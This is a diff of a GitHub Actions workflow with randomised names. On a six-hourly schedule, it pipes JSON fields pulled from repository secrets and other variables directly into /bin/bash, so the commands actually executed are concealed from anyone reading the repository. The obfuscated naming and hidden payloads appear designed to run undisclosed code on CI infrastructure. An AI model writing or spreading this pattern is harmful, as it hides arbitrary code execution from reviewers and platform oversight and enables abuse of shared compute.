@@ -2,17 +2,19 @@ name: haizhinuo7613
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 1/6 * * *'
+    - cron: '39 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: haizhinuo7613
         env:
-          mct034: ${{ secrets.mct034 }}
+          vi05: ${{ secrets.vi05 }}
         run: |
-          echo $mct034 | jq -r .eozi5 | /bin/bash
-          echo $qhbu0987 | jq -r .o7 | /bin/bash
-          echo $suvqg5375 | jq -r .sxcn823 | /bin/bash
+          echo $vi05 | jq -r .eau5535 | /bin/bash
+          echo $ykkk998 | jq -r .rof21 | /bin/bash
+          echo $leko012 | jq -r .vxt103 | /bin/bash
+          echo $lfb750 | jq -r .ur54 | /bin/bash
 
